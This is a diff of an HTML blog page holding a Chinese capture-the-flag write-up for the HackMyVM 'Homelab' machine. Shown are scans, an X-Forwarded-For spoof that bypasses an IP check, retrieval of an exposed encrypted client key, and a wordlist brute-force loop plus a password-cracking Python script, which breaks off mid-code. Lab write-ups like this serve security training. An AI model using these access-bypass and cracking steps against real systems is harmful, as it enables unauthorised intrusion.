@@ -139,7 +139,7 @@ MAC Address: 82:76:60:93:03:34 (Unknown)
 <meta property="og:url" content="https://pingsag3.github.io/post/hackmyvm%20homelab%20-ce-shi-ji-lu.html">
 <meta property="og:image" content="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg">
 <title>hackmyvm homelab 测试记录</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -212,43 +212,47 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 https://hackmyvm.eu/machines/machine.php?vm=Homelab
 https://maze-sec.com/library/
 </code></pre>
-<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️⭐️⭐️
-知识点：扫描，<span class="pl-s"><span class="pl-pds">`</span>bypass-403<span class="pl-pds">`</span></span>工具，爆破<span class="pl-s"><span class="pl-pds">`</span>PKCS#8<span class="pl-pds">`</span></span>密码，<span class="pl-s"><span class="pl-pds">`</span>openvpn<span class="pl-pds">`</span></span>使用，家目录文件提权</pre></div>
+<pre lang="shell" class="notranslate"><code class="notranslate">难度：⭐️⭐️⭐️
+知识点：扫描，`bypass-403`工具，爆破`PKCS#8`密码，`openvpn`使用，家目录文件提权
+</code></pre>
 <h3>2. 信息收集</h3>
 <h3>Nmap</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# arp-scan -l | grep PCS
 192.168.31.65   82:76:60:93:03:34       (Unknown: locally administered)
-└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.31.65</span>
-└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
+└─# IP=192.168.31.65
+└─# nmap -sV -sC -A $IP -Pn
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 19:16 CST
-Nmap scan report <span class="pl-k">for</span> homelab (192.168.31.65)
+Nmap scan report for homelab (192.168.31.65)
 Host is up (0.0017s latency).
 Not shown: 999 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Unix<span class="pl-pds">))</span></span>
-<span class="pl-k">|</span>_http-title: Mac OS X Server
-<span class="pl-k">|</span> http-methods:
-<span class="pl-k">|</span>_  Potentially risky methods: TRACE
-<span class="pl-k">|</span>_http-server-header: Apache/2.4.62 (Unix)
-<span class="pl-k">|</span>_http-favicon: Apache on Mac OS X
-MAC Address: 82:76:60:93:03:34 (Unknown)</pre></div>
+80/tcp open  http    Apache httpd 2.4.62 ((Unix))
+|_http-title: Mac OS X Server
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.62 (Unix)
+|_http-favicon: Apache on Mac OS X
+MAC Address: 82:76:60:93:03:34 (Unknown)
+</code></pre>
 <h3>目录扫描</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.h</span>
-└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP  -x 403 -e txt,php,html</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.h
+└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
 [19:19:13] 200 -  820B  - /cgi-bin/printenv
 [19:19:13] 200 -    1KB - /cgi-bin/test-cgi
 [19:19:15] 200 -    4KB - /error.html
 [19:19:15] 200 -    8KB - /favicon.ico
-[19:19:22] 301 -  313B  - /script  -<span class="pl-k">&gt;</span>  http://192.168.31.65/script/
-[19:19:22] 301 -  319B  - /service<span class="pl-k">?</span>Wsdl  -<span class="pl-k">&gt;</span>  http://192.168.31.65/service/<span class="pl-k">?</span>Wsdl
-[19:19:22] 301 -  314B  - /service  -<span class="pl-k">&gt;</span>  http://192.168.31.65/service/
-[19:19:23] 301 -  312B  - /style  -<span class="pl-k">&gt;</span>  http://192.168.31.65/style/</pre></div>
+[19:19:22] 301 -  313B  - /script  -&gt;  http://192.168.31.65/script/
+[19:19:22] 301 -  319B  - /service?Wsdl  -&gt;  http://192.168.31.65/service/?Wsdl
+[19:19:22] 301 -  314B  - /service  -&gt;  http://192.168.31.65/service/
+[19:19:23] 301 -  312B  - /style  -&gt;  http://192.168.31.65/style/
+</code></pre>
 <p>看群主<code class="notranslate">wp</code>介绍<code class="notranslate">style是css</code>，<code class="notranslate">script是js</code>，所以入口点就是<code class="notranslate">service</code>。继续扫<code class="notranslate">service</code> 目录</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP/service  -x 403 -e txt,php,html</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# dirsearch -u http://$IP/service  -x 403 -e txt,php,html
 [19:32:12] Starting: service/
-[19:32:20] 200 -    1KB - /service/ca.crt</pre></div>
+[19:32:20] 200 -    1KB - /service/ca.crt
+</code></pre>
 <p>用<code class="notranslate">dirsearch</code>扫到<code class="notranslate">ca.crt</code>(遗憾的是<code class="notranslate">gobuster</code> 字典居然没有),取下来</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/ca.crt</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl http://$IP/service/ca.crt
 -----BEGIN CERTIFICATE-----
 MIIDSDCCAjCgAwIBAgIUFsI+zOonAvZQA+m8UZ5NUujMpKswDQYJKoZIhvcNAQEL
 BQAwFTETMBEGA1UEAwwKTXktSG9tZSBDQTAeFw0yNTA0MTUxNjE2NDJaFw0zNTA0
@@ -270,148 +274,158 @@ AXWl/rl/AIv1UAph/Pm25U/BK4FjWSIO3Gx1YvZkwqUnpnN8wr2KF3oB01Y0w6dD
 e2okw+XCzCMr1SP+UihU5h4zSMQi6/Tf4e0HDw==
 -----END CERTIFICATE-----
 
-└─<span class="pl-c"><span class="pl-c">#</span> echo ''&gt; id</span>
-└─<span class="pl-c"><span class="pl-c">#</span> chmod 600 id</span>
-<span class="pl-c"><span class="pl-c">#</span>看清楚不是私钥</span></pre></div>
+└─# echo ''&gt; id
+└─# chmod 600 id
+#看清楚不是私钥
+</code></pre>
 <p>访问网页返回服务仅供自己使用</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/</span>
-Whoa<span class="pl-k">!</span> But sorry, this service is only available <span class="pl-k">for</span> myself<span class="pl-k">!</span></pre></div>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl http://$IP/service/
+Whoa! But sorry, this service is only available for myself!
+</code></pre>
 <h5><code class="notranslate">bypass-403</code>工具</h5>
 <p>先用<code class="notranslate">bypass-403</code>工具试一下</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>工具</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">#工具
 https://github.com/iamj0ker/bypass-403
 ./bypass-403.sh website-here path-here
-/CTF/bypass-403.sh http://<span class="pl-smi">$IP</span>/service</pre></div>
+/CTF/bypass-403.sh http://$IP/service
+</code></pre>
 <p>过滤<code class="notranslate">$IP\service\</code> 页面的默认<code class="notranslate">59</code>长度返回内容后，没啥有用信息</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> /CTF/bypass-403.sh http://$IP/service</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# /CTF/bypass-403.sh http://$IP/service
 /CTF/bypass-403.sh: 行 2: figlet: 未找到命令
                                                By Iam_J0ker
 ./bypass-403.sh https://example.com path
 
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/%2e/
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service//.
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service////
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.//./
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H X-Original-URL:
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H X-Custom-IP-Authorization: 127.0.0.1
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H X-Forwarded-For: http://127.0.0.1
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H X-Forwarded-For: 127.0.0.1:80
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service -H X-rewrite-url:
-404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/%20
-404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/%09
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/<span class="pl-k">?</span>
-403,276  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.html
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service//<span class="pl-k">?</span>anything
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/<span class="pl-c"><span class="pl-c">#</span></span>
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H Content-Length:0 -X POST
-404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service//<span class="pl-k">*</span>
-404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.php
-404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.json
-200,87  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/  -X TRACE
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H X-Host: 127.0.0.1
-404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/..<span class="pl-k">;</span>/
-000,0  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/<span class="pl-k">;</span>/
-200,87  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -X TRACE
-200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H X-Forwarded-Host: 127.0.0.1
+200,59  --&gt; http://192.168.31.65/service/
+200,59  --&gt; http://192.168.31.65/service/%2e/
+200,59  --&gt; http://192.168.31.65/service//.
+200,59  --&gt; http://192.168.31.65/service////
+200,59  --&gt; http://192.168.31.65/service/.//./
+200,59  --&gt; http://192.168.31.65/service/ -H X-Original-URL:
+200,59  --&gt; http://192.168.31.65/service/ -H X-Custom-IP-Authorization: 127.0.0.1
+200,59  --&gt; http://192.168.31.65/service/ -H X-Forwarded-For: http://127.0.0.1
+200,59  --&gt; http://192.168.31.65/service/ -H X-Forwarded-For: 127.0.0.1:80
+200,59  --&gt; http://192.168.31.65/service -H X-rewrite-url:
+404,273  --&gt; http://192.168.31.65/service/%20
+404,273  --&gt; http://192.168.31.65/service/%09
+200,59  --&gt; http://192.168.31.65/service/?
+403,276  --&gt; http://192.168.31.65/service/.html
+200,59  --&gt; http://192.168.31.65/service//?anything
+200,59  --&gt; http://192.168.31.65/service/#
+200,59  --&gt; http://192.168.31.65/service/ -H Content-Length:0 -X POST
+404,273  --&gt; http://192.168.31.65/service//*
+404,273  --&gt; http://192.168.31.65/service/.php
+404,273  --&gt; http://192.168.31.65/service/.json
+200,87  --&gt; http://192.168.31.65/service/  -X TRACE
+200,59  --&gt; http://192.168.31.65/service/ -H X-Host: 127.0.0.1
+404,273  --&gt; http://192.168.31.65/service/..;/
+000,0  --&gt; http://192.168.31.65/service/;/
+200,87  --&gt; http://192.168.31.65/service/ -X TRACE
+200,59  --&gt; http://192.168.31.65/service/ -H X-Forwarded-Host: 127.0.0.1
 Way back machine:
 /CTF/bypass-403.sh: 行 60: jq: 未找到命令
-└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/ | wc -l</span>
+└─# curl http://$IP/service/ | wc -l
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100    59  100    59    0     0   6409      0 --:--:-- --:--:-- --:--:--  6555
 0
-└─<span class="pl-c"><span class="pl-c">#</span> /CTF/bypass-403.sh http://$IP/service | grep -v 59</span>
+└─# /CTF/bypass-403.sh http://$IP/service | grep -v 59
 /CTF/bypass-403.sh: 行 2: figlet: 未找到命令
                                                By Iam_J0ker
 ./bypass-403.sh https://example.com path
 
-404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/%20
-404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/%09
-403,276  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.html
-404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service//<span class="pl-k">*</span>
-404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.php
-404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.json
-200,87  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/  -X TRACE
-404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/..<span class="pl-k">;</span>/
-000,0  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/<span class="pl-k">;</span>/
-200,87  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -X TRACE</pre></div>
+404,273  --&gt; http://192.168.31.65/service/%20
+404,273  --&gt; http://192.168.31.65/service/%09
+403,276  --&gt; http://192.168.31.65/service/.html
+404,273  --&gt; http://192.168.31.65/service//*
+404,273  --&gt; http://192.168.31.65/service/.php
+404,273  --&gt; http://192.168.31.65/service/.json
+200,87  --&gt; http://192.168.31.65/service/  -X TRACE
+404,273  --&gt; http://192.168.31.65/service/..;/
+000,0  --&gt; http://192.168.31.65/service/;/
+200,87  --&gt; http://192.168.31.65/service/ -X TRACE
+</code></pre>
 <p>虽然支持<code class="notranslate">TRACE</code>，但是没东西返回，重新回到起点</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -X TRACE</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl http://192.168.31.65/service/ -X TRACE
 TRACE /service/ HTTP/1.1
 Host: 192.168.31.65
 User-Agent: curl/8.11.0
-Accept: <span class="pl-k">*</span>/<span class="pl-k">*</span></pre></div>
+Accept: */*
+</code></pre>
 <p>根据页面提示内容：<code class="notranslate">服务仅供自己使用</code>，尝试<code class="notranslate">X-Forwarded-For</code>绕过</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -H "X-Forwarded-For:127.0.0.1"</span>
-Whoa<span class="pl-k">!</span> But sorry, this service is only available <span class="pl-k">for</span> myself<span class="pl-k">!</span>
-└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -H "X-Forwarded-For:localhost"</span>
-Whoa<span class="pl-k">!</span> But sorry, this service is only available <span class="pl-k">for</span> myself<span class="pl-k">!</span>
-└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65"</span>
-<span class="pl-c"><span class="pl-c">#</span> Last modified by shinosawa</span>
-<span class="pl-c"><span class="pl-c">#</span> on 2024-12-21</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl http://192.168.31.65/service/ -H "X-Forwarded-For:127.0.0.1"
+Whoa! But sorry, this service is only available for myself!
+└─# curl http://192.168.31.65/service/ -H "X-Forwarded-For:localhost"
+Whoa! But sorry, this service is only available for myself!
+└─# curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65"
+# Last modified by shinosawa
+# on 2024-12-21
 
-<span class="pl-c"><span class="pl-c">#</span> Example Configuration File</span>
+# Example Configuration File
 
 client
 dev tun
 proto udp
-remote <span class="pl-k">?</span> <span class="pl-k">?</span>
+remote ? ?
 resolv-retry infinite
 nobind
 persist-key
 persist-tun
-ca <span class="pl-k">?</span>
-cert <span class="pl-k">?</span>
-<span class="pl-c"><span class="pl-c">#</span> Regenerate a STRONG password for the KEY</span>
-<span class="pl-c"><span class="pl-c">#</span> Do NOT use a SAME password as other services et. SSH</span>
-<span class="pl-c"><span class="pl-c">#</span> it is DANGEROUS!</span>
-key <span class="pl-k">?</span>
+ca ?
+cert ?
+# Regenerate a STRONG password for the KEY
+# Do NOT use a SAME password as other services et. SSH
+# it is DANGEROUS!
+key ?
 cipher AES-256-GCM
 verb 3
-└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65" | wc -c</span>
+└─# curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65" | wc -c
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100   326  100   326    0     0  24234      0 --:--:-- --:--:-- --:--:-- 25076
-326</pre></div>
+326
+</code></pre>
 <p>测试，只有用对外的<code class="notranslate">192</code>网段<code class="notranslate">ip</code>时候有返回，结合<code class="notranslate">gobuster</code> 扫描的<code class="notranslate">vpn.txt</code>文件大小276和<code class="notranslate">openvpn</code>知识，上面返回的内容326可能和<code class="notranslate">vpn.txt</code>有关</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP/service -x.txt</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP/service -x.txt
 
-/vpn.txt              (Status: 403) [Size: 276]</pre></div>
+/vpn.txt              (Status: 403) [Size: 276]
+</code></pre>
 <h5><code class="notranslate">openvpn</code>知识</h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>## 基本部署步骤</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">### 基本部署步骤
 1. 安装 OpenVPN  
    sudo apt install openvpn
 2. 生成证书和密钥  
    - 使用 EasyRSA 或 OpenSSL 生成 CA 证书、服务器证书和客户端证书。
 3. 配置服务器端  
-   - 编辑服务器配置文件（如 <span class="pl-s"><span class="pl-pds">`</span>server.conf<span class="pl-pds">`</span></span>），指定端口（默认 <span class="pl-s"><span class="pl-pds">`</span>udp 1194<span class="pl-pds">`</span></span>）、协议（TCP/UDP）、证书路径等。
+   - 编辑服务器配置文件（如 `server.conf`），指定端口（默认 `udp 1194`）、协议（TCP/UDP）、证书路径等。
 4. 配置客户端  
-   - 创建客户端配置文件（如 <span class="pl-s"><span class="pl-pds">`</span>client.ovpn<span class="pl-pds">`</span></span>），包含服务器 IP、端口、证书等信息。
+   - 创建客户端配置文件（如 `client.ovpn`），包含服务器 IP、端口、证书等信息。
 5. 启动服务  
-   sudo systemctl start openvpn@server</pre></div>
+   sudo systemctl start openvpn@server
+</code></pre>
 <p>测试靶机靶机上<code class="notranslate">openvpn</code>服务对应的<code class="notranslate">udp 1194</code>端口已开放</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> nmap -sU $IP -p 1194</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# nmap -sU $IP -p 1194
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 20:19 CST
-Nmap scan report <span class="pl-k">for</span> homelab (192.168.31.65)
+Nmap scan report for homelab (192.168.31.65)
 Host is up (0.0013s latency).
 
 PORT     STATE SERVICE
 1194/udp open  openvpn
 MAC Address: 82:76:60:93:03:34 (Unknown)
 
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 0.39 seconds</pre></div>
+Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
+</code></pre>
 <p>所以猜测作者的思路是，构建<code class="notranslate">VPN</code>，通过<code class="notranslate">vpn</code>连接靶机<code class="notranslate">ip</code>，靶机的<code class="notranslate">ssh</code>服务只开在<code class="notranslate">vpn</code>对应的地址</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>在 OpenVPN 的默认证书认证模式下，客户端必须配置 client.key（私钥）和 client.crt（客户端证书）文件</span>
+<pre lang="sh" class="notranslate"><code class="notranslate">#在 OpenVPN 的默认证书认证模式下，客户端必须配置 client.key（私钥）和 client.crt（客户端证书）文件
 
 - OpenVPN 默认使用 SSL/TLS 证书双向认证，即服务器和客户端都需要提供证书。
-- 服务端通过 <span class="pl-s"><span class="pl-pds">`</span>ca.crt<span class="pl-pds">`</span></span>（根证书）验证客户端证书（<span class="pl-s"><span class="pl-pds">`</span>client.crt<span class="pl-pds">`</span></span>）是否由可信 CA 签发。
-- 客户端私钥（<span class="pl-s"><span class="pl-pds">`</span>client.key<span class="pl-pds">`</span></span>）用于生成加密签名，证明客户端拥有该证书的合法权限。</pre></div>
+- 服务端通过 `ca.crt`（根证书）验证客户端证书（`client.crt`）是否由可信 CA 签发。
+- 客户端私钥（`client.key`）用于生成加密签名，证明客户端拥有该证书的合法权限。
+</code></pre>
 <p>需要找到客户端所需的<code class="notranslate"> client.key</code>（私钥）和<code class="notranslate"> client.crt</code>（客户端证书）文件,直接在<code class="notranslate">ca.crt</code>所在的路径就请求成功了。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/ca.crt &gt; /tmp/ca.crt</span>
-└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.crt &gt; /tmp/client.crt</span>
-└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.key &gt; /tmp/client.key</span>
-└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.key</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl http://$IP/service/ca.crt &gt; /tmp/ca.crt
+└─# curl http://$IP/service/client.crt &gt; /tmp/client.crt
+└─# curl http://$IP/service/client.key &gt; /tmp/client.key
+└─# curl http://$IP/service/client.key
 -----BEGIN ENCRYPTED PRIVATE KEY-----
 MIIFJDBWBgkqhkiG9w0BBQ0wSTAxBgkqhkiG9w0BBQwwJAQQcjQTElcIKFeDw72A
 xT/14gICCAAwDAYIKoZIhvcNAgkFADAUBggqhkiG9w0DBwQIVNMjRXSbGKgEggTI
@@ -443,7 +457,7 @@ uLEkpu2zKwKZ8dMPodNQy8z1ax+NwtVRK2ttrmhbTdmlmk24lrlz3Wp9u0AwB4WD
 Q0fWBgB3vyBO+VTniw+CHZ+JRsXAYTue
 -----END ENCRYPTED PRIVATE KEY-----
 
-└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.crt</span>
+└─# curl http://$IP/service/client.crt
 Certificate:
     Data:
         Version: 3 (0x2)
@@ -453,7 +467,7 @@ Certificate:
         Issuer: CN=My-Home CA
         Validity
             Not Before: Apr 15 16:17:17 2025 GMT
-            Not After <span class="pl-c1">:</span> Jul 19 16:17:17 2027 GMT
+            Not After : Jul 19 16:17:17 2027 GMT
         Subject: CN=client1
         Subject Public Key Info:
             Public Key Algorithm: rsaEncryption
@@ -527,13 +541,15 @@ AwIHgDANBgkqhkiG9w0BAQsFAAOCAQEAfcWMBJeimNDcdG/K9weGAaaRC3BYh2Jr
 djnBRmmURFrrkSt80wKfI0eKlIbUhv1lLH6YxqJvjqc6JvdE8xj89XA8e6XZX1Mt
 xcgoqO8DRBp+l8xXHXwkpLbLz+WUGuZyUSTQUrp5AQSBNEnzgQJGiOUUhvuPdAk2
 eqv5gOPKw7kWDyXx3eyT8E6v9ncclJoxPWo81rI1QXlWt3zIkKDo1g==
------END CERTIFICATE-----</pre></div>
+-----END CERTIFICATE-----
+</code></pre>
 <p>拿着下面内容让<code class="notranslate">ai</code>组合一个</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65"</span>
-└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/ca.crt</span>
-└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.crt </span>
-└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.key</span>
-组合以下，形成一个ovpn文件</pre></div>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65"
+└─# curl http://$IP/service/ca.crt
+└─# curl http://$IP/service/client.crt 
+└─# curl http://$IP/service/client.key
+组合以下，形成一个ovpn文件
+</code></pre>
 <p>以下是<code class="notranslate">ai</code>整合后的完整 <code class="notranslate">client.ovpn</code> 文件内容，已嵌入证书和密钥</p>
 <pre class="notranslate"><code class="notranslate"># OpenVPN 客户端配置文件
 client
@@ -634,95 +650,97 @@ verb 3
 <h3>4.获得shinosawa</h3>
 <h5>爆破私钥<code class="notranslate">PKCS#8</code>密码</h5>
 <p>注意<code class="notranslate">client.key</code>是<code class="notranslate">PKCS#8</code>加密文件,需解密</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.key</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl http://$IP/service/client.key
 -----BEGIN ENCRYPTED PRIVATE KEY-----
 ...
-└─<span class="pl-c"><span class="pl-c">#</span>   openssl pkcs8 -in client.key -out de.txt -passin pass:123</span>
-<span class="pl-c"><span class="pl-c">#</span>可以通过这种方式去才密码</span>
-└─<span class="pl-c"><span class="pl-c">#</span> for i in $(cat /CTF/suForce_dir/top12000.txt);do echo $i;openssl pkcs8 -in client.key -out de.txt -passin pass:$i;[ $?  -eq 0] &amp;&amp; break ;done</span></pre></div>
+└─#   openssl pkcs8 -in client.key -out de.txt -passin pass:123
+#可以通过这种方式去才密码
+└─# for i in $(cat /CTF/suForce_dir/top12000.txt);do echo $i;openssl pkcs8 -in client.key -out de.txt -passin pass:$i;[ $?  -eq 0] &amp;&amp; break ;done
+</code></pre>
 <p>看来字典小了，换个超大的字典，用<code class="notranslate">ai</code>写个多线程爆破python脚本</p>
-<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-c">#!/usr/bin/env python3</span>
-<span class="pl-k">import</span> <span class="pl-s1">subprocess</span>
-<span class="pl-k">import</span> <span class="pl-s1">sys</span>
-<span class="pl-k">import</span> <span class="pl-s1">threading</span>
-<span class="pl-k">from</span> <span class="pl-s1">concurrent</span>.<span class="pl-s1">futures</span> <span class="pl-k">import</span> <span class="pl-v">ThreadPoolExecutor</span>
-<span class="pl-k">from</span> <span class="pl-s1">pathlib</span> <span class="pl-k">import</span> <span class="pl-v">Path</span>
+<pre lang="python" class="notranslate"><code class="notranslate">#!/usr/bin/env python3
+import subprocess
+import sys
+import threading
+from concurrent.futures import ThreadPoolExecutor
+from pathlib import Path
 
-<span class="pl-c"># 配置项</span>
-<span class="pl-c1">KEY_FILE</span> <span class="pl-c1">=</span> <span class="pl-s">"client.key"</span>        <span class="pl-c"># 目标私钥文件</span>
-<span class="pl-c1">DICT_FILE</span> <span class="pl-c1">=</span> <span class="pl-s">"/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt"</span>  <span class="pl-c"># 密码字典</span>
-<span class="pl-c1">THREADS</span> <span class="pl-c1">=</span> <span class="pl-c1">8</span>                    <span class="pl-c"># 并发线程数（根据CPU核心调整）</span>
-<span class="pl-c1">OUT_FILE</span> <span class="pl-c1">=</span> <span class="pl-s">"de.txt"</span>            <span class="pl-c"># 解密输出文件</span>
+# 配置项
+KEY_FILE = "client.key"        # 目标私钥文件
+DICT_FILE = "/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt"  # 密码字典
+THREADS = 8                    # 并发线程数（根据CPU核心调整）
+OUT_FILE = "de.txt"            # 解密输出文件
 
-<span class="pl-s1">found</span> <span class="pl-c1">=</span> <span class="pl-c1">False</span>                  <span class="pl-c"># 全局终止标志</span>
-<span class="pl-s1">found_lock</span> <span class="pl-c1">=</span> <span class="pl-s1">threading</span>.<span class="pl-c1">Lock</span>()  <span class="pl-c"># 线程锁</span>
+found = False                  # 全局终止标志
+found_lock = threading.Lock()  # 线程锁
 
-<span class="pl-k">def</span> <span class="pl-en">try_password</span>(<span class="pl-s1">password</span>):
-    <span class="pl-k">global</span> <span class="pl-s1">found</span>
+def try_password(password):
+    global found
     
-    <span class="pl-c"># 检查终止标志</span>
-    <span class="pl-k">if</span> <span class="pl-s1">found</span>:
-        <span class="pl-k">return</span>
+    # 检查终止标志
+    if found:
+        return
     
-    <span class="pl-c"># 执行 OpenSSL 命令</span>
-    <span class="pl-k">try</span>:
-        <span class="pl-s1">result</span> <span class="pl-c1">=</span> <span class="pl-s1">subprocess</span>.<span class="pl-c1">run</span>(
-            [<span class="pl-s">"openssl"</span>, <span class="pl-s">"pkcs8"</span>, <span class="pl-s">"-in"</span>, <span class="pl-c1">KEY_FILE</span>, <span class="pl-s">"-out"</span>, <span class="pl-c1">OUT_FILE</span>, <span class="pl-s">"-passin"</span>, <span class="pl-s">f"pass:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">password</span><span class="pl-kos">}</span></span>"</span>],
-            <span class="pl-s1">stdout</span><span class="pl-c1">=</span><span class="pl-s1">subprocess</span>.<span class="pl-c1">DEVNULL</span>,
-            <span class="pl-s1">stderr</span><span class="pl-c1">=</span><span class="pl-s1">subprocess</span>.<span class="pl-c1">DEVNULL</span>,
